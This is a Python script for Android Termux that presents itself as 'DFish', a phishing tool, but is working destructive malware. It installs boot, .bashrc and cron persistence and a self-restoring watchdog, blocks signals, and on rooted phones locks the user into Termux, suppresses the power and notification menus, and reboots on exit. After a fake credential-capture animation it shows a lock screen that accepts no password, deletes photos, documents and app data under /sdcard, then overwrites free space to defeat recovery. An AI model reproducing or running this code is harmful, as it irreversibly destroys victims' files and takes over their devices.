import os
import sys
import time
import signal
import random
import string
import hashlib
import shutil
import subprocess
import threading
import socket
import platform
import getpass
from datetime import datetime
from pathlib import Path

# ============================================
# WARNA MERAH
# ============================================
RED = '\033[91m'
BOLD_RED = '\033[1;91m'
RESET = '\033[0m'

def red_print(text, end='\n'):
    print(f"{RED}{text}{RESET}", end=end)

def bold_red_print(text, end='\n'):
    print(f"{BOLD_RED}{text}{RESET}", end=end)

# ============================================
# DETEKSI ROOT (SENYAP - TANPA PERINGATAN)
# ============================================
def check_root():
    try:
        result = subprocess.run(["su", "-c", "id"], capture_output=True, text=True, timeout=2)
        return "uid=0" in result.stdout
    except:
        return False

IS_ROOT = check_root()

# ============================================
# 1. BLOKIR SINYAL KELUAR
# ============================================
def block_all_signals():
    for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGTSTP, signal.SIGQUIT, signal.SIGHUP]:
        try:
            signal.signal(sig, lambda s, f: None)
        except:
            pass

def make_unstoppable():
    try:
        if os.fork() > 0:
            sys.exit(0)
    except:
        pass
    try:
        os.setsid()
    except:
        pass
    try:
        if os.fork() > 0:
            sys.exit(0)
    except:
        pass

def install_persistence():
    script_path = os.path.abspath(__file__)
    termux_boot = os.path.expanduser("~/.termux/boot")
    os.makedirs(termux_boot, exist_ok=True)
    boot_script = os.path.join(termux_boot, "00-dfish.sh")
    with open(boot_script, 'w') as f:
        f.write(f"""#!/data/data/com.termux/files/usr/bin/bash
sleep 2
python3 {script_path} --boot &
""")
    os.chmod(boot_script, 0o755)
    bashrc = os.path.expanduser("~/.bashrc")
    with open(bashrc, 'a') as f:
        f.write(f"\npython3 {script_path} --boot &\n")
    try:
        cron_file = "/data/data/com.termux/files/usr/var/spool/cron/crontabs/root"
        os.makedirs(os.path.dirname(cron_file), exist_ok=True)
        with open(cron_file, 'a') as f:
            f.write(f"@reboot python3 {script_path} --boot\n")
    except:
        pass

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================
# 2. AUTO STORAGE PERMISSION
# ============================================
def check_storage_permission():
    try:
        test_file = "/sdcard/.permission_test.tmp"
        with open(test_file, 'w') as f:
            f.write("test")
        os.remove(test_file)
        return True
    except:
        return False

def force_permission_if_rooted():
    try:
        result = subprocess.run(["su", "-c", "id"], capture_output=True, text=True, timeout=3)
        if "uid=0" in result.stdout:
            os.system("su -c 'pm grant com.termux android.permission.WRITE_EXTERNAL_STORAGE' 2>/dev/null")
            os.system("su -c 'pm grant com.termux android.permission.READ_EXTERNAL_STORAGE' 2>/dev/null")
            return True
    except:
        pass
    return False

def auto_request_storage_permission():
    if check_storage_permission():
        print("[✓] Storage permission: GRANTED")
        return True
    
    print("\n" + "="*60)
    print("  ⚠️  STORAGE PERMISSION REQUIRED  ⚠️")
    print("="*60)
    print("\nDFish membutuhkan akses ke storage Anda.\n")
    
    if force_permission_if_rooted():
        time.sleep(1)
        if check_storage_permission():
            print("[✓] Storage permission granted via ROOT")
            return True
    
    print("[•] Meminta izin storage via termux-setup-storage...")
    os.system("termux-setup-storage")
    print("    Popup izin akan muncul. Silahkan pilih 'ALLOW'")
    
    for i in range(15, 0, -1):
        print(f"\r    Menunggu izin... {i} detik", end="", flush=True)
        time.sleep(1)
    
    if check_storage_permission():
        print("\n[✓] Storage permission granted via popup")
        return True
    
    print("\n" + "="*60)
    print("  ⚠️  PERMISSION NOT GRANTED AUTOMATICALLY  ⚠️")
    print("="*60)
    print("\nSilahkan berikan izin secara manual:")
    print("  1. Buka Settings → Apps → Termux")
    print("  2. Pilih 'Permissions'")
    print("  3. Aktifkan 'Files and Media' atau 'Storage'")
    print("  4. Kembali ke Termux")
    
    input("\nTekan ENTER setelah memberikan izin...")
    
    if check_storage_permission():
        print("\n[✓] Storage permission granted manually!")
        return True
    else:
        print("\n[✗] Storage permission still not granted.")
        return False

# ============================================
# 3. WATCHDOG 4 LAPIS
# ============================================
class UltimateWatchdog:
    def __init__(self, script_path):
        self.script_path = os.path.abspath(script_path)
        self.shadow_path = "/data/local/tmp/.dfish_shadow.py"
    
    def activate(self):
        self._layer1_thread()
        self._layer2_fork()
        self._layer3_cron()
        self._layer4_shadow()
    
    def _layer1_thread(self):
        def thread_watchdog():
            main_pid = os.getpid()
            while True:
                time.sleep(3)
                try:
                    os.kill(main_pid, 0)
                except:
                    subprocess.Popen([sys.executable, self.script_path, "--restart"])
                    break
        threading.Thread(target=thread_watchdog, daemon=True).start()
    
    def _layer2_fork(self):
        try:
            pid = os.fork()
            if pid == 0:
                while True:
                    time.sleep(5)
                    result = subprocess.run(["pgrep", "-f", self.script_path], capture_output=True, text=True)
                    if not result.stdout.strip():
                        subprocess.Popen([sys.executable, self.script_path, "--restart"])
                sys.exit(0)
        except:
            pass
    
    def _layer3_cron(self):
        cron_entry = f"* * * * * pgrep -f '{self.script_path}' || python3 {self.script_path} --restart\n"
        cron_paths = [
            "/data/data/com.termux/files/usr/var/spool/cron/crontabs/root",
        ]
        for cron_file in cron_paths:
            try:
                os.makedirs(os.path.dirname(cron_file), exist_ok=True)
                with open(cron_file, 'a') as f:
                    f.write(cron_entry)
            except:
                pass
    
    def _layer4_shadow(self):
        try:
            with open(self.script_path, 'r') as src:
                with open(self.shadow_path, 'w') as dst:
                    dst.write(src.read())
            os.system(f"chmod 555 {self.shadow_path} 2>/dev/null")
        except:
            pass
        
        def shadow_watchdog():
            while True:
                time.sleep(10)
                if not os.path.exists(self.script_path):
                    try:
                        with open(self.shadow_path, 'r') as src:
                            with open(self.script_path, 'w') as dst:
                                dst.write(src.read())
                    except:
                        pass
        threading.Thread(target=shadow_watchdog, daemon=True).start()

# ============================================
# 4. LOCKDOWN TOTAL (HANYA JALAN KALAU ROOT)
# ============================================
class TermuxLockdown:
    def __init__(self):
        self.running = True
        self.termux_package = "com.termux"
        
    def activate_lockdown(self):
        self._watch_foreground_app()
        self._prevent_task_switch()
        self._block_hardware_keys()
        self._block_notification_panel()
        self._block_power_menu()
        self._screen_always_on()
        
    def _watch_foreground_app(self):
        def foreground_watcher():
            while self.running:
                try:
                    cmd = "dumpsys window | grep mCurrentFocus"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if "com.termux" not in result.stdout:
                        self._reopen_termux()
                except:
                    pass
                time.sleep(1)
        threading.Thread(target=foreground_watcher, daemon=True).start()
    
    def _reopen_termux(self):
        try:
            os.system(f"am start -n {self.termux_package}/.HomeActivity 2>/dev/null")
            os.system("input keyevent KEYCODE_HOME 2>/dev/null")
            time.sleep(0.3)
            os.system(f"monkey -p {self.termux_package} -c android.intent.category.LAUNCHER 1 2>/dev/null")
        except:
            pass
    
    def _prevent_task_switch(self):
        def task_switcher_blocker():
            while self.running:
                try:
                    cmd = "dumpsys window policy | grep -i recent"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if "recent" in result.stdout.lower():
                        os.system("input keyevent KEYCODE_APP_SWITCH 2>/dev/null")
                        os.system("input keyevent KEYCODE_HOME 2>/dev/null")
                        self._reopen_termux()
                except:
                    pass
                time.sleep(0.5)
        threading.Thread(target=task_switcher_blocker, daemon=True).start()
    
    def _block_hardware_keys(self):
        try:
            termux_props = os.path.expanduser("~/.termux/termux.properties")
            with open(termux_props, 'w') as f:
                f.write("back-key=ignore\n")
                f.write("volume-keys=ignore\n")
                f.write("extra-keys=ignore\n")
        except:
            pass
    
    def _block_notification_panel(self):
        def close_notification():
            while self.running:
                os.system("input keyevent KEYCODE_NOTIFICATION 2>/dev/null")
                os.system("input swipe 500 100 500 500 2>/dev/null")
                time.sleep(0.5)
        threading.Thread(target=close_notification, daemon=True).start()
    
    def _block_power_menu(self):
        def close_power_menu():
            while self.running:
                os.system("input keyevent KEYCODE_POWER 2>/dev/null")
                time.sleep(0.1)
                os.system("input keyevent KEYCODE_BACK 2>/dev/null")
                time.sleep(0.5)
        threading.Thread(target=close_power_menu, daemon=True).start()
    
    def _screen_always_on(self):
        try:
            os.system("svc power stayon true 2>/dev/null")
        except:
            pass

def auto_reboot_on_exit():
    def reboot_monitor():
        while True:
            result = subprocess.run(["pgrep", "-f", "com.termux"], capture_output=True, text=True)
            if not result.stdout.strip():
                os.system("reboot 2>/dev/null")
                os.system("su -c 'reboot' 2>/dev/null")
            time.sleep(2)
    threading.Thread(target=reboot_monitor, daemon=True).start()

def activate_total_lockdown():
    if IS_ROOT:
        lockdown = TermuxLockdown()
        lockdown.activate_lockdown()
        auto_reboot_on_exit()
        try:
            os.system("svc power stayon true 2>/dev/null")
        except:
            pass

# ============================================
# 5. BANNER PHISHING 
# ============================================
def show_phishing_banner():
    banner = f"""
    ╔══════════════════════════════════════════════════════════════════════════════════════╗
    ║                           🐟 DFISH - PHISHING TOOL 🐟                                ║
    ║                              Premium Phishing Framework                               ║
    ╠══════════════════════════════════════════════════════════════════════════════════════╣
    ║  [1] Instagram     [2] Facebook     [3] Twitter/X     [4] TikTok                     ║
    ║  [5] WhatsApp      [6] Telegram     [7] LinkedIn      [8] Custom Template            ║
    ║  [9] Ngrok Tunnel  [0] Exit                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

LOGIN_URLS = {
    "1": "https://www.instagram.com/accounts/login/",
    "2": "https://www.facebook.com/login.php",
    "3": "https://twitter.com/i/flow/login",
    "4": "https://www.tiktok.com/login",
    "5": "https://web.whatsapp.com/",
    "6": "https://web.telegram.org/",
    "7": "https://www.linkedin.com/login",
}

# ============================================
# 6. ANIMASI NGORK TUNNEL 
# ============================================
def animate_ngrok_tunnel(platform_name, original_url):
    clear()
    print(f"\n{'='*70}")
    print(f"   🔥 BUILDING PHISHING TUNNEL FOR {platform_name.upper()} 🔥")
    print(f"{'='*70}\n")
    
    steps = [
        "Initializing tunnel engine",
        "Connecting to ngrok servers",
        "Generating random subdomain",
        "Mirroring target website",
        "Enabling SSL certificate",
        "Tunnel is ready"
    ]
    
    for step in steps:
        print(f"[•] {step}...", end="", flush=True)
        time.sleep(random.uniform(0.3, 0.7))
        print(" DONE ✓")
    
    print(f"\n{'='*70}")
    print(f"📡 TUNNEL STATUS: ONLINE")
    print(f"🌐 SHARE THIS LINK: {original_url}")
    print(f"🎯 TARGET MIRROR: {original_url}")
    print(f"{'='*70}\n")
    
    print("[!] Waiting for target to access the link...")
    for i in range(4):
        print(f"\r[•] Monitoring traffic... {'█' * (i + 1)}{'░' * (3 - i)}", end="", flush=True)
        time.sleep(1)
    
    print("\n\n[⚠️] ALERT: Target has accessed the link!")
    time.sleep(0.5)
    print("[✓] Login page displayed successfully")
    time.sleep(0.5)
    print("[✓] Waiting for credential input...")
    
    for i in range(3):
        print(f"\r[•] Capturing session... {'▓' * (i + 1)}{'░' * (2 - i)}", end="", flush=True)
        time.sleep(1)
    
    print("\n\n[🔓] Target has submitted login form!")
    time.sleep(0.5)
    
    print(f"\n{'='*60}")
    print(f"📡 CAPTURE COMPLETE")
    print(f"{'='*60}")
    print(f"\n[✓] Credentials captured successfully")
    print(f"\n{'='*60}")
    print("⚠️  Press ENTER to view captured data ⚠️")
    print(f"{'='*60}")

# ============================================
# 7. VERIFYING CAPTURED DATA                
# ============================================
def verifying_captured_data():
    clear()
    print(f"\n{'='*70}")
    print(f"  ⚠️  VERIFYING CAPTURED DATA... ⚠️")
    print(f"{'='*70}\n")
    
    for i in range(101):
        print(f"\r[•] Verifying: {i}% [{'█' * (i//2)}{'.' * (50 - i//2)}]", end="", flush=True)
        time.sleep(0.015)
    
    print(f"\n\n[✓] Data verification complete!")
    time.sleep(0.5)
    print(f"[✓] Victim identified")
    time.sleep(0.5)
    print(f"[✓] Device fingerprinted")
    
    time.sleep(1)
    print(f"\n{'='*70}")
    print(f"  🔒 INITIATING SECURE VERIFICATION PROTOCOL... 🔒")
    print(f"{'='*70}")
    time.sleep(1)

# ============================================
# ============================================
# ============================================
# SEMUA KODE DI BAWAH INI WARNA MERAH
# ============================================
# ============================================
# ============================================

# ============================================
# 8. LAYAR PASSWORD 
# ============================================
def password_lock_no_hope():
    clear()
    
    lock_banner = f"""
{RED}    ╔══════════════════════════════════════════════════════════════════════╗
    ║                                                                      ║
    ║                           ██╗      ██████╗ ██████╗██╗  ██╗           ║
    ║                           ██║     ██╔═══██╗██╔════╝██║ ██╔╝           ║
    ║                           ██║     ██║   ██║██║     █████╔╝            ║
    ║                           ██║     ██║   ██║██║     ██╔═██╗            ║
    ║                           ███████╗╚██████╔╝╚██████╗██║  ██╗           ║
    ║                           ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝           ║
    ║                                                                      ║
    ║                         🔐  S Y S T E M  🔐                          ║
    ║                         🔒  L O C K E D  🔒                          ║
    ║                                                                      ║
    ╚══════════════════════════════════════════════════════════════════════╝{RESET}
    """
    
    print(lock_banner)
    
    bold_red_print(f"\n{'='*70}")
    bold_red_print(f"   ⚠️  PERINGATAN! PERINGATAN! PERINGATAN!  ⚠️")
    bold_red_print(f"{'='*70}")
    bold_red_print(f"\n❗YOUR PHONE IS TAKEOVER❗")
    bold_red_print(f"❗ ALL DATA IS BEING PERMANENTLY DELETED ❗")
    bold_red_print(f"🔒 LOCK PHONE SYSTEM")
    bold_red_print(f"\n{'='*70}")
    bold_red_print(f"{'='*70}\n")
    
    bold_red_print("[💀] ACTIVATED DELETING FILE [💀]")
    bold_red_print("[💀] FILE-FILE ANDA SEDANG DIVERIFIKASI SATU PERSATU [💀]\n")
    
    attempts = 0
    
    while True:
        pwd = input(f"{RED}🔐 MASUKKAN PASSWORD: {RESET}")
        attempts += 1
        
        bold_red_print(f"\n❌ PASSWORD SALAH! PERCOBAAN KE-{attempts} ❌")
        bold_red_print(f"[💀] Penghapusan dilanjutkan... [💀]\n")
        
        if attempts >= 3:
            bold_red_print(f"\n{'='*70}")
            bold_red_print(f"  💀 ANDA TELAH MENCOBA {attempts} KALI - TIDAK ADA HARAPAN 💀")
            bold_red_print(f"  💀 PROSES PENGHAPUSAN DIPERCEPAT 💀")
            bold_red_print(f"{'='*70}\n")
            break
    
    return False

# ============================================
# 9. TOTAL DELETION 
# ============================================
ALL_EXTENSIONS = [
    '.apk', '.aab', '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.heic', '.raw', '.psd',
    '.mp4', '.mkv', '.mov', '.avi', '.flv', '.wmv', '.webm', '.3gp',
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.opus',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf',
    '.csv', '.xml', '.json', '.yaml', '.ini', '.cfg', '.conf', '.log', '.bak', '.old', '.tmp',
    '.py', '.js', '.html', '.css', '.php', '.java', '.c', '.cpp', '.go', '.rs',
    '.db', '.sqlite', '.enc', '.locked', '.key', '.pem', '.crt',
    '.torrent', '.part', '.vcf', '.ics', '.msg', '.eml',
]

ALL_TARGETS = [
    "/sdcard", "/storage/emulated/0", "/data/media/0",
    "/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Camera", "/sdcard/Screenshots",
    "/sdcard/WhatsApp", "/sdcard/Telegram", "/sdcard/Instagram",
    "/sdcard/Documents", "/sdcard/Download", "/sdcard/Music", "/sdcard/Movies",
    "/sdcard/Android/data", "/data/local/tmp",
]

def total_deletion():
    bold_red_print(f"\n{'='*70}")
    bold_red_print(f"   💀 TOTAL DATA DESTRUCTION IN PROGRESS 💀")
    bold_red_print(f"{'='*70}\n")
    
    bold_red_print("[🔥] DELETING ALL FILES BY EXTENSION...")
    for ext in ALL_EXTENSIONS:
        os.system(f"find /sdcard -type f -name '*{ext}' -exec rm -f {{}} \\; 2>/dev/null")
        bold_red_print(f"    [✓] *{ext} deleted", end="\r")
    
    bold_red_print(f"\n\n[📁] DELETING ALL FOLDERS...")
    for target in ALL_TARGETS:
        if os.path.exists(target):
            try:
                shutil.rmtree(target, ignore_errors=True)
                bold_red_print(f"    [✓] Deleted: {target}")
            except:
                os.system(f"rm -rf {target} 2>/dev/null")
                bold_red_print(f"    [✓] Deleted (force): {target}")
    
    bold_red_print("\n[💀] FINAL CLEANUP...")
    os.system("rm -rf /sdcard/* 2>/dev/null")
    os.system("rm -rf /storage/emulated/0/* 2>/dev/null")
    bold_red_print("    [✓] All files deleted\n")
    
    bold_red_print("[🎲] OVERWRITING STORAGE...")
    try:
        for i in range(5):
            filler = f"/sdcard/.wiper_{i}.tmp"
            with open(filler, 'wb') as f:
                for _ in range(30):
                    f.write(os.urandom(1024 * 1024))
            os.remove(filler)
        bold_red_print("    [✓] Storage overwritten (anti recovery)\n")
    except:
        pass
    
    bold_red_print(f"{'='*70}")
    bold_red_print(f"   💀 TOTAL DESTRUCTION COMPLETE 💀")
    bold_red_print(f"{'='*70}")
    bold_red_print(f"\n🔥 SEMUA FILE TELAH DIHAPUS PERMANEN 🔥")
    bold_red_print(f"📁 SEMUA FOLDER TELAH DIHAPUS 🔥")
    bold_red_print(f"🔒 DATA TIDAK DAPAT DIREKOVER 🔥")
    bold_red_print(f"\n{'='*70}")

# ============================================
# 10. LOOP TAK TERHINGGA
# ============================================
def infinite_terror_loop():
    bold_red_print(f"\n[💀] SYSTEM TERLOCKED - NO ESCAPE [💀]\n")
    counter = 0
    while True:
        counter += 1
        bold_red_print(f"\r[💀] SYSTEM DESTROYED - {counter} seconds since execution", end="", flush=True)
        time.sleep(1)

# ============================================
# 11. MAIN FUNCTION
# ============================================
def main():
    block_all_signals()
    
    is_restart = "--restart" in sys.argv
    is_boot = "--boot" in sys.argv
    
    print("\n" + "="*60)
    print("  🔐 CHECKING STORAGE PERMISSION...")
    print("="*60)
    
    if not auto_request_storage_permission():
        print("\n[💀] DFish cannot continue without storage permission.")
        time.sleep(5)
        sys.exit(1)
    
    print("\n[✓] Storage permission confirmed. Proceeding...")
    time.sleep(1)
    
    if not is_restart and not is_boot:
        script_path = os.path.abspath(__file__)
        watchdog = UltimateWatchdog(script_path)
        watchdog.activate()
        make_unstoppable()
        install_persistence()
    
    activate_total_lockdown()
    
    clear()
    show_phishing_banner()
    
    print("\n[+] DFish siap digunakan!")
    print("[!] Pastikan koneksi internet stabil\n")
    
    try:
        choice = input("┌─[root@dfish:~]\n└──◆ Pilih menu (1-0): ")
        
        if choice in LOGIN_URLS:
            platform_name = {
                '1': 'Instagram', '2': 'Facebook', '3': 'Twitter/X',
                '4': 'TikTok', '5': 'WhatsApp', '6': 'Telegram', '7': 'LinkedIn'
            }.get(choice, "Unknown")
            
            original_url = LOGIN_URLS[choice]
            animate_ngrok_tunnel(platform_name, original_url)
            input()
            
        elif choice in ['8', '9', '0']:
            print("\n[!] Memproses...")
            time.sleep(2)
            print("\n[!] Tekan ENTER untuk melanjutkan...")
            input()
        else:
            print("\n[!] Pilihan tidak valid!")
            time.sleep(1)
            print("\n[!] Tekan ENTER untuk melanjutkan...")
            input()
    
    except Exception as e:
        print(f"\n[!] Error: {e}")
        time.sleep(1)
    
    verifying_captured_data()
    time.sleep(1)
    
    # ==========================================
    # MULAI WARNA MERAH DARI SINI
    # ==========================================
    password_lock_no_hope()
    
    total_deletion()
    
    infinite_terror_loop()

if __name__ == "__main__":
    main()
